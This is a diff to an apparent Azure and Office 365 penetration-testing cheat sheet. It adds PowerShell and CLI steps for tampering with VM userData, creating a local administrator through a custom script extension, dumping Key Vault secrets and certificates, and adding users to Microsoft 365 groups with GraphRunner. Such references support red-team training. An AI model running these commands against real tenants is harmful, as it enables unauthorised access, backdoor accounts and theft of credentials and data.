@@ -16,7 +16,7 @@
     * [Reset password](#Reset-password) 
 * [Azure Resources Exploitation](#Azure-Resources-Exploitation)
   * [Storage account](#Storage-account)
-  * [Keyvault](#Keyvault)
+  * [Key Vault](#Key-Vault)
   * [Automation account](#Automation-account)
   * [Virtual Machines](#Virtual-Machines)
   * [Deployments](#Deployments)
@@ -25,6 +25,8 @@
   * [Azure Container Registry dump](#Azure-Container-Registry-dump)
   * [Azure ARC](#Azure-ARC)
   * [Kubernetes](#Kubernetes)
+* [Office 365](#Office-365)
+  * [Updateable groups](#Updateable-groups)
 
 ## General
 ### Requesting access tokens
@@ -84,20 +86,64 @@ curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01
 Add-AzureADGroupMember -ObjectId <GROUP ID> -RefObjectId <USER ID> -Verbose
 ```
 
-#### Authenticate with Service Principal / Managed Identity
-- Uses cleartext credentials.
-```
-$password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
-$creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)
-Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
-```
-
 ## Exploitation Enumeration
 ### When on a new machine
+### Get machine info
+```
+systeminfo
+```
+
+#### Check if Azure or Domain joined
+```
+dsregcmd /status
+```
+
 #### Get context of current user
 ```
 az ad signed-in-user show
 Get-AzContext
+```
+
+#### Check UserData
+```
+$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text";[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
+```
+
+#### Modify UserData
+```
+## It is also possible to modify user data with permissions "Microsoft.Compute/virtualMachines/write" on the target VM. Any automation or scheduled task reading commands from user data can be abused!
+
+$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("whoami"))
+$accessToken = (Get-AzAccessToken).Token
+$Url = "https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm?api-version=2021-07-01"
+$body = @(
+@{
+location = "Germany West Central"
+properties = @{
+userData = "$data"
+}
+}
+) | ConvertTo-Json -Depth 4
+
+$headers = @{
+Authorization = "Bearer $accessToken"
+}
+
+## Execute Rest API Call
+
+$Results = Invoke-RestMethod -Method Put -Uri $Url -Body $body -Headers $headers -ContentType 'application/json'
+```
+
+#### Check VM Extensions
+```
+Get-AzVMExtension -ResourceGroupName <RESEARCH GROUP NAME> -VMName <VM NAME>
+```
+
+#### Set VM Extensions
+```
+#Following permissions are required to create a custom script extension and read the output: "Microsoft.Compute/virtualMachines/extensions/write" and "Microsoft.Compute/virtualMachines/extensions/read"
+
+Set-AzVMExtension -ResourceGroupName <RESEARCH GROUP NAME> -VMName <VM NAME> -ExtensionName ExecCmd -Location germanywestcentral -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users <NEW USER> <PASSWORD> /add /Y; net localgroup administrators <NEW USER> /add /Y"}'
 ```
 
 #### Get access token
@@ -113,7 +159,7 @@ az account get-access-token --resource-type ms-graph
 env
 ```
 
-### After getting a new user
+### After getting a new user / managed identity
 #### Check for other tenants
 - Login to the Azure portal and in the right top click on the user and then `Switch Directory`.
 ```
@@ -145,6 +191,23 @@ az role assignment list
 ##### Get current Azure role assignments
 ```
 Get-AzRoleAssignment
+```
+
+#### Get Entra ID role assignments for objectID
+```
+Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '<OBJECT ID>'" | ForEach-Object {
+	$roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId
+	[PSCustomObject]@{
+		RoleDisplayName = $roleDef.DisplayName
+		RoleId = $roleDef.Id
+		DirectoryScopeId = $_.DirectoryScopeId
+	}
+} | Select-Object RoleDisplayName, RoleId, DirectoryScopeId | fl
+```
+
+#### Check API permissions / App Role Assignments for OBJECT ID
+```
+Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId <OBJECT ID>
 ```
 
 #### Get the role definition
@@ -203,12 +266,25 @@ env
 #### Request access token(s) for managed identity
 - See [Requesting access tokens](#Requesting-access-tokens)
 
-#### Use access tokens to connect with AZ Module
+#### Authenticate with Service Principal / Managed Identity
+- With cleartext credentials.
+```
+$password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)
+Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
+```
+
+- With Access tokens
 - Account ID can be found in `Client_ID` value from requesting the tokens.
 ```
 $mgmtToken = <TOKEN>
 $graphToken = <TOKEN>
 Connect-AzAccount -AccessToken $mgmtToken -GraphAccessToken $graphToken -AccountId <ID>
+```
+
+- Using certificate
+```
+Connect-AzAccount -ServicePrincipal -ApplicationId <APP ID> -Tenant <TENANT ID> -CertificatePath <PATH TO CERT>
 ```
 
 #### Use the AZ module to exploit the permissions this managed identity may have!
@@ -278,17 +354,24 @@ Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
 Get-AzStorageAccount
 ```
 
-#### Check if there is a container that is acccessible
+#### Store context
 ```
-Get-AzStorageContainer -Context (Get-AzStorageAccount -Name <NAME> -ResourceGroupName <RESOURCEGROUPNAME>).Context
+$context = New-AzStorageContext -StorageAccountName <RESOURCE NAME>
 ```
 
-#### Access Storage Accounts AZ powershell
+#### Check if there is a container that is acccessible
 ```
-$StorageAccount = Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>
-Get-AzStorageContainer -Context $StorageAccount.Context
-Get-AzStorageBlob -Container <NAME> -Context $StorageAccount.Context
-Get-AzStorageBlobContent -Container <NAME> -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context -Blob <NAME>
+Get-AzStorageContainer -Context $context
+```
+
+#### List blobs
+```
+Get-AzStorageBlob -Container <NAME> -Context $context
+```
+
+#### Retrieve files
+```
+Get-AzStorageBlobContent -Container <NAME> -Context $context -Blob <NAME> -Verbose
 ```
 
 #### Access Storage Account
@@ -302,25 +385,44 @@ Get-AzStorageAccountKey -name <NAME OF STORAGE> -resourcegroupname <NAME>
 
 #### Connect to the storage account with "Storage Explorer" using the account name and account keys
 
-## Keyvault
-#### List keyvaults
+## Key Vault
+#### List key vaults
 ```
 Get-AzKeyVault
 ```
 
-#### Get info about a specific keyvault
+#### Get info about a specific key vault
 ```
 Get-AzKeyVault -VaultName <VAULT NAME>
 ```
 
-#### List the saved creds from keyvault
+#### List the saved credentials
 ```
 Get-AzKeyVaultSecret -VaultName <VAULT NAME> -AsPlainText
 ```
 
-#### Read creds from a keyvault
+#### Read creds
 ```
 Get-AzKeyVaultSecret -VaultName <VAULT NAME> -Name <NAME> -AsPlainText
+```
+
+#### List saved certificates 
+```
+Get-AzKeyVaultCertificate -VaultName <VAULT NAME>
+```
+
+#### Read certificate
+```
+Get-AzKeyVaultSecret -VaultName <VAULT NAME> -Name <CERT NAME> -AsPlainText
+
+$secret = Get-AzKeyVaultSecret -VaultName <VAULT NAME> -Name <CERT NAME> -AsPlainText
+$secretByte = [Convert]::FromBase64String($secret)
+[System.IO.File]::WriteAllBytes("C:\Users\Public\Cert.pfx", $secretByte)
+```
+
+#### Dump certificate info
+```
+certutil.exe -dump C:\Users\Public\Cert.pfx
 ```
 
 ## Automation account
@@ -376,6 +478,7 @@ Start-AzAutomationRunbook -RunbookName <NAME OF RUNBOOK> -RunOn <WORKERGROUP NAM
 ```
 
 ### Extract credentials automation account
+- https://github.com/NetSPI/MicroBurst
 ```
 Import-Module Microburst.psm1
 Get-AzurePasswords
@@ -600,3 +703,20 @@ cat /var/run/secrets/kubernetes.io/serviceaccount/token
 ```
 ./kubectl describe pods
 ```
+
+## Office 365
+### Updateable groups
+- https://github.com/dafthack/GraphRunner
+
+#### Check for updateable groups
+```
+Get-UpdatableGroups -Tokens $tokens
+```
+
+#### Add to interesting group
+```
+Invoke-AddGroupMember -Tokens $tokens -GroupId <ID> -userId <USERID>
+```
+
+#### Check for access of group
+- Browse through the Teams channel and SharePoint files for interesting data!
